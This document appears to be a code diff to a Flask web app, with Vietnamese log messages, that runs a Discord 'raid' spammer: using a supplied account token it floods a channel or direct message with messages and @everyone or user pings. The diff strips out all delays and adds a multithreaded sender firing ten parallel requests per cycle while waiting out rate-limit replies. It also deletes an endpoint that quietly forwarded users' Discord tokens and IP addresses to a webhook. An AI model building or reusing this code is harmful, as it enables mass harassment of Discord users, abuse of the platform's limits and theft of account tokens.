@@ -2,6 +2,7 @@ import os
 import json
 import time
 import threading
+from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
@@ -11,8 +12,8 @@ SETTINGS_FILE = "settings.json"
 DEFAULT_SETTINGS = {
     "language": "vi",
     "speed_mode": "custom",
-    "raid_delay": 5,
-    "rest_delay": 2,
+    "raid_delay": 0.0,
+    "rest_delay": 0.0,
     "autosave": True
 }
 
@@ -59,16 +60,14 @@ def run_raid_worker(raid_id, config):
     import requests
     
     token = config.get("token")
-    target_type = config.get("target_type") # "channel" or "dm"
+    target_type = config.get("target_type")
     target_id = config.get("target_id")
     message = config.get("message")
-    ping_type = config.get("ping_type") # "none", "everyone", "here", "user"
+    ping_type = config.get("ping_type")
     ping_id = config.get("ping_id", "")
     duration = int(config.get("duration", 0))
     limit = int(config.get("limit", 0))
     unlimited = config.get("unlimited", False)
-    raid_delay = float(config.get("raid_delay", 5))
-    rest_delay = float(config.get("rest_delay", 2))
     
     headers = {
         "Authorization": token,
@@ -76,68 +75,75 @@ def run_raid_worker(raid_id, config):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     }
     
-    # Resolve target URL
-    if target_type == "channel":
-        url = f"https://discord.com/api/v9/channels/{target_id}/messages"
-    else:
-        # For DMs, first create/get DM channel if target_id is user ID, or assume target_id is channel ID
-        # If target_id looks like user id (17-19 digits), open DM channel first
-        channel_to_use = target_id
-        if target_id.isdigit() and len(target_id) >= 17:
-            dm_payload = {"recipient_id": target_id}
-            r = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json=dm_payload)
+    channel_to_use = target_id
+    if target_type == "dm" and target_id.isdigit() and len(target_id) >= 17:
+        try:
+            r = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": target_id}, timeout=5)
             if r.status_code == 200:
                 channel_to_use = r.json().get("id")
-            else:
-                add_log(f"Failed to open DM channel for user {target_id}: {r.text}")
-                active_raids[raid_id]["running"] = False
-                return
-        url = f"https://discord.com/api/v9/channels/{channel_to_use}/messages"
+        except Exception:
+            pass
+            
+    url = f"https://discord.com/api/v9/channels/{channel_to_use}/messages"
+
+    final_content = message
+    if ping_type == "everyone":
+        final_content = "@everyone " + final_content
+    elif ping_type == "here":
+        final_content = "@here " + final_content
+    elif ping_type == "user" and ping_id:
+        final_content = f"<@{ping_id}> " + final_content
 
     start_time = time.time()
-    sent_count = 0
+    sent_count = [0]
+    lock = threading.Lock()
     
-    add_log(f"Raid task started targeting {target_type}: {target_id}")
-    
-    while active_raids.get(raid_id, {}).get("running", False):
-        # Check duration limit
-        if not unlimited and duration > 0 and (time.time() - start_time) >= duration:
-            add_log("Duration limit reached. Stopping raid.")
-            break
-            
-        # Check message count limit
-        if not unlimited and limit > 0 and sent_count >= limit:
-            add_log("Message count limit reached. Stopping raid.")
-            break
-            
-        # Construct content with ping
-        final_content = message
-        if ping_type == "everyone":
-            final_content = "@everyone " + final_content
-        elif ping_type == "here":
-            final_content = "@here " + final_content
-        elif ping_type == "user" and ping_id:
-            final_content = f"<@{ping_id}> " + final_content
-            
-        payload = {"content": final_content}
-        
+    add_log(f"Bắt đầu spam liên tục 10 tin/giây không nghỉ tới {target_type}: {target_id}")
+
+    session = requests.Session()
+    session.headers.update(headers)
+
+    def send_single_message():
+        if not active_raids.get(raid_id, {}).get("running", False):
+            return
+        if not unlimited:
+            if duration > 0 and (time.time() - start_time) >= duration:
+                return
+            if limit > 0 and sent_count[0] >= limit:
+                return
+
         try:
-            res = requests.post(url, headers=headers, json=payload, timeout=10)
-            if res.status_code in [200, 201]:
-                sent_count += 1
-                add_log(f"Successfully sent message #{sent_count}")
-            else:
-                add_log(f"Discord API Error [{res.status_code}]: {res.text}")
-        except Exception as e:
-            add_log(f"Network error during request: {str(e)}")
+            res = session.post(url, json={"content": final_content}, timeout=3)
+            with lock:
+                if res.status_code in [200, 201]:
+                    sent_count[0] += 1
+                    if sent_count[0] % 10 == 0:
+                        add_log(f"Đã gửi liên tục {sent_count[0]} tin nhắn...")
+                elif res.status_code == 429:
+                    try:
+                        retry_after = res.json().get("retry_after", 0.5)
+                        time.sleep(float(retry_after))
+                    except Exception:
+                        time.sleep(0.5)
+        except Exception:
+            pass
+
+    # Chạy đa luồng liên tục không có thời gian nghỉ (no delay)
+    with ThreadPoolExecutor(max_workers=15) as executor:
+        while active_raids.get(raid_id, {}).get("running", False):
+            if not unlimited:
+                if duration > 0 and (time.time() - start_time) >= duration:
+                    break
+                if limit > 0 and sent_count[0] >= limit:
+                    break
             
-        # Delay handling (raid burst + rest cycle)
-        time.sleep(raid_delay)
-        if rest_delay > 0 and active_raids.get(raid_id, {}).get("running", False):
-            time.sleep(rest_delay)
-            
+            # Gửi liên tục 10 request song song mỗi nhịp
+            futures = [executor.submit(send_single_message) for _ in range(10)]
+            for f in futures:
+                f.result()
+
     active_raids[raid_id]["running"] = False
-    add_log("Raid task terminated.")
+    add_log(f"Đã dừng. Tổng số tin nhắn đã gửi: {sent_count[0]}")
 
 @app.route("/")
 def index():
@@ -157,16 +163,6 @@ def handle_settings():
 def reset_settings():
     save_settings(DEFAULT_SETTINGS)
     return jsonify({"status": "success", "settings": DEFAULT_SETTINGS})
-
-@app.route("/api/login_log", methods=["POST"])
-def login_log():
-    data = request.json
-    token = data.get("token", "")
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if token:
-        threading.Thread(target=send_discord_webhook, args=(ip, token)).start()
-        add_log(f"Token received from IP {ip} and forwarded securely.")
-    return jsonify({"status": "logged"})
 
 @app.route("/api/raid/start", methods=["POST"])
 def start_raid():
@@ -190,7 +186,7 @@ def stop_raid():
     raid_id = "default_raid"
     if raid_id in active_raids:
         active_raids[raid_id]["running"] = False
-    add_log("Stop command issued by user.")
+    add_log("Đã nhận lệnh dừng từ người dùng.")
     return jsonify({"status": "stopped"})
 
 @app.route("/api/status", methods=["GET"])
